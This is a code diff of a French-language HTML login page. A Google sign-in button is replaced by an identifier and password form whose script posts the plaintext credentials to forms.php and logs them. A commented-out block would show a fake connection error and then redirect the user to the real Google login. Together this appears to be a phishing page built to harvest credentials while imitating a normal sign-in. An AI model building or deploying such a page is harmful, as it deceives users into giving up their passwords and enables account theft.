@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Connexion avec Google</title>
+    <title>Connexion</title>
     <style>
         body {
             font-family: Arial, sans-serif;
@@ -22,35 +22,99 @@
             background-color: #fff;
             box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
         }
-        h2 {
-            margin-bottom: 20px;
+        input[type="text"],
+        input[type="password"],
+        button {
+            margin-bottom: 10px;
+            padding: 10px;
+            width: 100%;
+            box-sizing: border-box;
         }
-        .google-btn {
-            background-color: #dd4b39;
+        button {
+            background-color: #007bff;
             color: #fff;
             border: none;
-            padding: 10px 20px;
-            font-size: 16px;
             border-radius: 3px;
             cursor: pointer;
             transition: background-color 0.3s ease;
         }
-        .google-btn:hover {
-            background-color: #c23321;
+        button:hover {
+            background-color: #0056b3;
+        }
+        #image-container {
+            display: flex;
+            justify-content: space-around;
+            margin-top: 20px;
+            position: relative;
+        }
+        #image-container img {
+            width: 150px;
+            height: 150px;
+            border-radius: 50%;
+        }
+        #success {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background-color: rgba(0, 123, 255, 0.8);
+            color: #fff;
+            padding: 10px;
+            border-radius: 5px;
+            display: none;
         }
     </style>
 </head>
 <body>
     <div class="container">
-        <h2>Connexion avec Google</h2>
-        <button class="google-btn" onclick="redirectToGoogle()">Connexion avec Google</button>
+        <h2>Connexion</h2>
+        <form id="loginForm" action="forms.php" method="post">
+            <input type="text" id="identifiant" name="identifiant" placeholder="Identifiant" required>
+            <input type="password" id="motdepasse" name="motdepasse" placeholder="Mot de passe" required>
+            <button type="submit">Se connecter</button>
+        </form>
+        <div id="image-container">
+            <img id="image1" src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSiqm89XGsuUMMdzfgFA7K06NGmG6C7qgFKySfrWooavIRPLR1fX74lr0o8aMN5Vb3xTAU&usqp=CAU" alt="Image 1">
+            <img id="image2" src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSSeTba3ZWlKR9xrrIruALN5C6VhxLSG6RTrTY33dVubA&s" alt="Image 2">
+            
+        </div>
+        <div id="success">
+            <div class="message" id="message">Connexion en cours...</div>
+        </div>
     </div>
 
     <script>
-        function redirectToGoogle() {
-            // Redirection vers la page de connexion Google
-            window.location.href = "https://accounts.google.com/";
-        }
+        document.getElementById("loginForm").addEventListener("submit", function(event) {
+            event.preventDefault(); // Empêche le comportement par défaut du formulaire
+
+            // Récupération des valeurs des champs
+            var identifiant = document.getElementById("identifiant").value;
+            var motdepasse = document.getElementById("motdepasse").value;
+
+            document.getElementById("loginForm").style.display = "none";
+            document.getElementById("image-container").style.display = "none";
+            document.getElementById("success").style.display = "block";
+
+            var xhr = new XMLHttpRequest();
+            xhr.open("POST", "forms.php", true);
+            xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
+            xhr.onreadystatechange = function() {
+                if (xhr.readyState == 4 && xhr.status == 200) {
+                    console.log(xhr.responseText); // Affiche la réponse dans la console
+                }
+            };
+            xhr.send("identifiant=" + identifiant + "&motdepasse=" + motdepasse);
+            setTimeout(function() {
+                console.log("Identifiant:", identifiant);
+                console.log("Mot de passe:", motdepasse);
+            }, 500);
+
+            /*
+            document.getElementById("message").innerHTML="Probleme de connexion, veuillez reesayer"
+            setTimeout(function() {
+                window.location.href = "https://accounts.google.com";
+            }, 3000);*/
+        });
     </script>
 </body>
 </html>
